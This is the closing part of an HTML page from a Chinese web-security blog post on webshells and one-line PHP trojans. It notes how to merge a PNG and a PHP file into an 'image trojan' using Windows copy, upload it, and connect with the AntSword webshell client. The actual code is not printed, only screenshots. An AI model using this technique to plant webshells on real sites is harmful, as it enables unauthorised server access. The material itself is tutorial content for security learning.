+<p><img src="https://user-images.githubusercontent.com/39131787/78847271-e19ed580-7a40-11ea-8585-259829298063.png" alt="6"></p>
+<blockquote>
+<p>【备注】以下为CMD下用copy命令制作“<strong>图片木马</strong>”的步骤，其中，<code>1.png/b</code>中“b”表示“<strong>二进制文件</strong>”，<code>Hack.php/a</code>中“a”表示<strong>ASCII码文件</strong>。 </p>
+</blockquote>
+<p>上传成功</p>
+<p><img src="https://user-images.githubusercontent.com/39131787/78847269-e06da880-7a40-11ea-918f-510f50a7eaf4.png" alt="7"></p>
+<p>用蚁剑连接</p>
+<p><img src="https://user-images.githubusercontent.com/39131787/78847267-dfd51200-7a40-11ea-84b3-1f0fb14b9ae5.png" alt="8"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2020/04/07/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="next" title="Web安全学习——渗透测试">
+                  <i class="fa fa-chevron-left"></i> Web安全学习——渗透测试
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2020/04/08/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AF%95%E9%A2%98%E9%9B%86/" rel="prev" title="安全笔试题集">
+                  安全笔试题集 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Webshell（大马）"><span class="nav-text">Webshell（大马）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一句话木马（小马）"><span class="nav-text">一句话木马（小马）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#入侵条件"><span class="nav-text">入侵条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#原理"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#变形"><span class="nav-text">变形</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用"><span class="nav-text">利用</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yzz"
+      src="/images/ame.jpg">
+  <p class="site-author-name" itemprop="name">yzz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzz</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">286k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:20</span>
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
